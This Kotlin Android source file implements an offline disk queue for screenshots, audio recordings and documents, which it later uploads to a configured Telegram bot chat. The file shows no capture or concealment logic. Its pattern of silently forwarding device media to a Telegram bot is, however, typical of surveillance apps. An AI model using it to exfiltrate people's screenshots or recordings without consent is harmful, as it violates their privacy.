package com.example.telegramsender.utils

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.Locale
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Manages local disk queue for screenshots, audio recordings, and other media
 * when device is offline or network send fails.
 * Enforces a strict 20MB storage capacity with FIFO (First In, First Out) eviction.
 */
object OfflineQueueManager {
    private const val TAG = "OfflineQueueManager"
    const val MAX_QUEUE_BYTES = 20 * 1024 * 1024L // 20 MB

    private val isFlushing = AtomicBoolean(false)

    private val defaultClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    fun getQueueDir(context: Context): File {
        val dir = File(context.filesDir, "offline_queue")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }

    fun getQueueSizeBytes(context: Context): Long {
        val dir = getQueueDir(context)
        val files = dir.listFiles() ?: return 0L
        var total = 0L
        for (f in files) {
            if (f.isFile) total += f.length()
        }
        return total
    }

    fun getQueueItemCount(context: Context): Int {
        val dir = getQueueDir(context)
        return dir.listFiles()?.count { it.isFile } ?: 0
    }

    fun getQueueSummary(context: Context): String {
        val count = getQueueItemCount(context)
        val bytes = getQueueSizeBytes(context)
        val mbUsed = bytes / (1024.0 * 1024.0)
        return if (count == 0) {
            "Empty (0 MB / 20 MB max)"
        } else {
            String.format(Locale.US, "%d queued (%.2f MB / 20 MB max)", count, mbUsed)
        }
    }

    fun isNetworkAvailable(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    @Synchronized
    private fun ensureCapacity(context: Context, incomingBytes: Long) {
        val dir = getQueueDir(context)
        val files = dir.listFiles()?.filter { it.isFile }?.sortedBy { it.lastModified() }?.toMutableList() ?: return
        var currentSize = files.sumOf { it.length() }

        while (currentSize + incomingBytes > MAX_QUEUE_BYTES && files.isNotEmpty()) {
            val oldest = files.removeAt(0)
            val size = oldest.length()
            if (oldest.delete()) {
                currentSize -= size
                Log.d(TAG, "Evicted oldest file: ${oldest.name} ($size bytes) to maintain 20MB limit")
            }
        }
    }

    @Synchronized
    fun enqueuePhoto(context: Context, bytes: ByteArray, prefix: String = "photo_screenshot"): Boolean {
        if (bytes.isEmpty()) return false
        return try {
            ensureCapacity(context, bytes.size.toLong())
            val dir = getQueueDir(context)
            val fileName = "${prefix}_${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(6)}.jpg"
            val file = File(dir, fileName)
            FileOutputStream(file).use { it.write(bytes) }
            Log.d(TAG, "Enqueued photo: ${file.name} (${bytes.size} bytes). Total queue: ${getQueueSummary(context)}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enqueue photo", e)
            false
        }
    }

    @Synchronized
    fun enqueueAudio(context: Context, sourceFile: File): Boolean {
        if (!sourceFile.exists() || sourceFile.length() <= 4096L) {
            Log.w(TAG, "Refusing to enqueue invalid or too small audio file (${sourceFile.length()} bytes)")
            return false
        }
        return try {
            ensureCapacity(context, sourceFile.length())
            val dir = getQueueDir(context)
            val fileName = "audio_${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(6)}.m4a"
            val targetFile = File(dir, fileName)
            sourceFile.copyTo(targetFile, overwrite = true)
            Log.d(TAG, "Enqueued audio: ${targetFile.name} (${targetFile.length()} bytes). Total queue: ${getQueueSummary(context)}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to enqueue audio", e)
            false
        }
    }

    suspend fun flushQueue(context: Context, client: OkHttpClient = defaultClient): Int = withContext(Dispatchers.IO) {
        if (!isNetworkAvailable(context)) {
            Log.d(TAG, "Cannot flush queue: Network is currently unavailable")
            return@withContext 0
        }

        if (!isFlushing.compareAndSet(false, true)) {
            Log.d(TAG, "Queue flush already in progress, skipping concurrent trigger")
            return@withContext 0
        }

        var sentCount = 0
        try {
            val pref = context.getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
            val token = pref.getString("token", "") ?: ""
            val chatId = pref.getString("chatId", "") ?: ""

            if (token.isEmpty() || chatId.isEmpty()) {
                Log.w(TAG, "Cannot flush offline queue: Telegram bot token or chat ID is missing")
                return@withContext 0
            }

            val dir = getQueueDir(context)
            val files = dir.listFiles()?.filter { it.isFile }?.sortedBy { it.lastModified() } ?: return@withContext 0

            if (files.isEmpty()) {
                return@withContext 0
            }

            Log.d(TAG, "Starting offline queue flush: ${files.size} items queued (${getQueueSummary(context)})")

            for (file in files) {
                if (!isNetworkAvailable(context)) {
                    Log.w(TAG, "Network disconnected during offline queue flush. Pausing remaining items.")
                    break
                }

                val success = when {
                    file.name.startsWith("photo_") -> sendPhotoFile(token, chatId, file, client)
                    file.name.startsWith("audio_") -> sendAudioFile(token, chatId, file, client)
                    file.name.startsWith("doc_") -> sendDocFile(token, chatId, file, client)
                    else -> {
                        file.delete()
                        false
                    }
                }

                if (success) {
                    file.delete()
                    sentCount++
                    Log.d(TAG, "Successfully flushed queued item: ${file.name}")
                    // Rate limiting buffer: 400ms between telegram API calls
                    kotlinx.coroutines.delay(400)
                } else {
                    Log.w(TAG, "Failed to send queued item ${file.name}. Halting flush to preserve queue.")
                    break
                }
            }

            if (sentCount > 0) {
                pref.edit()
                    .putLong("last_offline_flush_time", System.currentTimeMillis())
                    .putInt("last_offline_flush_count", sentCount)
                    .apply()
                Log.d(TAG, "Queue flush complete: sent $sentCount items. Remaining: ${getQueueSummary(context)}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception during offline queue flush", e)
        } finally {
            isFlushing.set(false)
        }

        return@withContext sentCount
    }

    private fun sendPhotoFile(token: String, chatId: String, file: File, client: OkHttpClient): Boolean {
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        return try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    true
                } else {
                    Log.e(TAG, "sendPhoto failed HTTP ${response.code}: ${response.message}")
                    if (response.code in 400..403) {
                        file.delete() // Corrupt or unsendable, remove from queue
                    }
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error sending queued photo", e)
            false
        }
    }

    private fun sendAudioFile(token: String, chatId: String, file: File, client: OkHttpClient): Boolean {
        if (!file.exists() || file.length() <= 4096L) {
            Log.w(TAG, "Queued audio file ${file.name} is corrupt or too small (${file.length()} bytes). Deleting.")
            file.delete()
            return true // Remove corrupt file and allow queue to proceed
        }

        // 1. Try sendVoice first
        val voiceUrl = "https://api.telegram.org/bot$token/sendVoice"
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("voice", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
                .build()
            val request = Request.Builder().url(voiceUrl).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    return true
                } else {
                    val err = response.body?.string() ?: ""
                    Log.w(TAG, "sendVoice for queued audio returned HTTP ${response.code}: $err")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "sendVoice exception on queued item: ${e.message}")
        }

        // 2. Fallback to sendAudio
        val audioUrl = "https://api.telegram.org/bot$token/sendAudio"
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("audio", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
            .build()
        val request = Request.Builder().url(audioUrl).post(requestBody).build()
        return try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    true
                } else {
                    val err = response.body?.string() ?: ""
                    Log.e(TAG, "sendAudio failed HTTP ${response.code}: $err")
                    if (response.code in 400..403) {
                        file.delete()
                    }
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error sending queued audio", e)
            false
        }
    }

    private fun sendDocFile(token: String, chatId: String, file: File, client: OkHttpClient): Boolean {
        val url = "https://api.telegram.org/bot$token/sendDocument"
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", file.name, file.asRequestBody("text/plain".toMediaTypeOrNull()))
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        return try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    true
                } else {
                    if (response.code in 400..403) file.delete()
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error sending queued document", e)
            false
        }
    }
}
